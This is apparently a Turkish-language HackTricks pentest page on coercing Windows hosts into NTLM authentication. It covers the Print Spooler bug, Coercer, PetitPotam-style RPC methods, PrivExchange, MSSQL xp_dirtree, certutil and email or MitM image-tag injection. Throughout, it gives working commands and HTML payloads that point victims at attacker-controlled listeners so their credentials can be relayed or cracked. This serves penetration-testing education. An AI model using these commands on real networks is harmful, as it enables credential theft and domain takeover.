# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers), 3rd party bağımlılıklarını önlemek amacıyla MIDL compiler kullanılarak C# ile kodlanmış bir **remote authentication trigger** **collection**'ıdır.

## Spooler Service Abuse

_**Print Spooler**_ service **enabled** ise, önceden bilinen bazı AD kimlik bilgilerini kullanarak Domain Controller'ın print server'ından yeni print job'lar hakkında bir **update** talep edebilir ve bildirimi belirli bir sisteme **göndermesini** isteyebilirsiniz.\
Printer bildirimi rastgele bir sisteme gönderdiğinde, o **system**'e karşı **authenticate** olması gerekir. Bu nedenle bir attacker, _**Print Spooler**_ service'ini rastgele bir system'e karşı **authenticate** olmaya zorlayabilir ve service bu authentication işleminde **computer account**'u **kullanır**.

Arka planda, klasik **PrinterBug** primitive'i **`RpcRemoteFindFirstPrinterChangeNotificationEx`** çağrısını **`\\PIPE\\spoolss`** üzerinden kötüye kullanır. Attacker önce bir printer/server handle açar ve ardından `pszLocalMachine` içinde sahte bir client name sağlar; böylece hedef spooler, **attacker-controlled host**'a **geri doğru** bir notification channel oluşturur. Bu nedenle ortaya çıkan etki, doğrudan code execution yerine **outbound authentication coercion**'dır.<sup>[[2]](#references)</sup>\
Spooler'ın kendisinde **RCE/LPE** arıyorsanız [PrintNightmare](printnightmare.md) sayfasına bakın. Bu sayfa **coercion ve relay** üzerine odaklanır.

### Finding Windows Servers on the domain

PowerShell kullanarak Windows box'larının bir listesini alın. Server'lar genellikle öncelikli olduğundan, burada onlara odaklanalım:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Dinleyen Spooler servislerini bulma

@mysmartlogin'ın (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracının biraz değiştirilmiş bir sürümünü kullanarak Spooler Service'in dinleyip dinlemediğini kontrol edin:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux üzerinde `rpcdump.py` kullanabilir ve **MS-RPRN** protokolünü arayabilirsiniz:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Veya Linux üzerinden hostları **NetExec/CrackMapExec** ile hızlıca test edin:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Spooler endpoint'inin yalnızca mevcut olup olmadığını kontrol etmek yerine **coercion surfaces**'larını enumerate etmek istiyorsanız, **Coercer scan mode**'unu kullanın:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Bu kullanışlıdır çünkü endpoint'i EPM'de görmek yalnızca print RPC interface'inin kaydedildiğini gösterir. **Mevcut yetkilerinizle her coercion method'un erişilebilir olduğunu veya host'un kullanılabilir bir authentication flow başlatacağını garanti etmez.**

### Service'den rastgele bir host'a authenticate olmasını isteyin

[SpoolSample'i buradan](https://github.com/NotMedic/NetNTLMtoSilverTicket) compile edebilirsiniz.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ve Linux kullanıyorsanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer** ile spooler arayüzlerini doğrudan hedefleyebilir ve hangi RPC methodunun açığa çıktığını tahmin etmekten kaçınabilirsiniz:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClient ile SMB yerine HTTP zorlamak

Klasik PrinterBug genellikle `\\attacker\share` adresine bir **SMB** kimlik doğrulaması sağlar; bu, **capture**, **HTTP hedeflerine relay** veya SMB signing özelliğinin bulunmadığı durumlarda **relay** için hâlâ kullanışlıdır.\
Ancak modern ortamlarda **SMB signing** nedeniyle **SMB'den SMB'ye relay** işlemi sıklıkla engellenir; bu nedenle operatörler genellikle bunun yerine **HTTP/WebDAV** kimlik doğrulamasını zorlamayı tercih eder.

Hedefte **WebClient** service çalışıyorsa listener, Windows'un **WebDAV over HTTP** kullanmasını sağlayacak bir biçimde belirtilebilir:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Bu, özellikle **`ntlmrelayx --adcs`** veya diğer HTTP relay hedefleriyle zincirleme kullanımda oldukça faydalıdır; çünkü zorlanan bağlantıda SMB relayability özelliğine güvenme gereksinimini ortadan kaldırır. Önemli uyarı: HTTP/WebDAV varyantının çalışması için kurban üzerinde **WebClient çalışıyor olmalıdır**.

### Unconstrained Delegation ile Birleştirme

Bir saldırgan daha önce [Unconstrained Delegation](unconstrained-delegation.md) bulunan bir bilgisayarı ele geçirdiyse, **printer'ın bu bilgisayara authenticate olmasını sağlayabilir**. Unconstrained delegation nedeniyle **printer'ın computer account'una ait TGT**, unconstrained delegation bulunan bilgisayarın **memory** alanına **kaydedilir**. Saldırgan bu host'u daha önce ele geçirdiğinden, **bu ticket'ı alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Not: Bu yöntemler, UNC path taşıyabilen parametreleri kabul eder (ör. `\\attacker\share`). İşlendiğinde Windows, bu UNC'ye machine/user context ile authenticate olur ve NetNTLM capture veya relay yapılmasını mümkün kılar.\
Spooler abuse için **MS-RPRN opnum 65**, protokol specification'ı `pszLocalMachine` tarafından belirtilen client'a geri bir notification channel oluşturulduğunu açıkça belirttiğinden, en yaygın ve en iyi belgelenmiş primitive olmaya devam etmektedir.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target, sağlanan backup log path'ini açmayı dener ve attacker-controlled UNC'ye authenticate olur.<sup>[[1]](#references)</sup>
- Practical use: Tier 0 asset'lerini (DC/RODC/Citrix/etc.) NetNTLM göndermeye zorlamak, ardından bunu AD CS endpoint'lerine (ESC8/ESC11 senaryoları) veya diğer privileged service'lere relay etmek.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack, **Exchange Server `PushSubscription` feature** içinde bulunan bir flaw'ın sonucudur. Bu feature, mailbox sahibi herhangi bir domain user tarafından Exchange server'ın HTTP üzerinden client tarafından sağlanan herhangi bir host'a authenticate olmaya zorlanmasına olanak tanır.

Varsayılan olarak **Exchange service SYSTEM olarak çalışır** ve aşırı privileges ile çalıştırılır (özellikle, **2019 öncesi Cumulative Update'te domain üzerinde WriteDacl privileges'a sahiptir**). Bu flaw, bilgilerin LDAP'ye **relay edilmesini** ve ardından domain NTDS database'inin extract edilmesini sağlamak için exploit edilebilir. LDAP'ye relay mümkün olmadığında bile bu flaw, domain içindeki diğer host'lara relay yapmak ve authenticate olmak için kullanılabilir. Bu attack'ın başarılı şekilde exploit edilmesi, authenticate olmuş herhangi bir domain user account ile Domain Admin'e anında erişim sağlar.

## Windows İçinde

Zaten Windows machine içindeyseniz, privileged account'lar kullanarak Windows'un bir server'a bağlanmasını şu şekilde zorlayabilirsiniz:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Veya şu diğer tekniği kullanın: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM authentication'ı zorlamak için certutil.exe lolbin'ini (Microsoft imzalı binary) kullanmak mümkündür:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### E-posta üzerinden

Ele geçirmek istediğiniz makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona örneğin **1x1 boyutunda bir görsel** içeren bir **e-posta** gönderebilirsiniz.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
ve açtığında kimlik doğrulaması yapmaya çalışacaktır.

### MitM

Bir bilgisayara MitM attack gerçekleştirebilir ve kullanıcının görüntüleyeceği bir sayfaya HTML enjekte edebilirseniz, sayfaya aşağıdaki gibi bir görsel enjekte etmeyi deneyebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication'ı zorlamanın ve phish etmenin diğer yolları


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

[NTLMv1 challenge'larını yakalayabiliyorsanız, bunları nasıl crack'leyeceğinizi buradan okuyabilirsiniz](../ntlm/index.html#ntlmv1-attack).\
_Unutmayın, NTLMv1'i crack'lemek için Responder challenge değerini "1122334455667788" olarak ayarlamanız gerekir._

## Referanslar

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
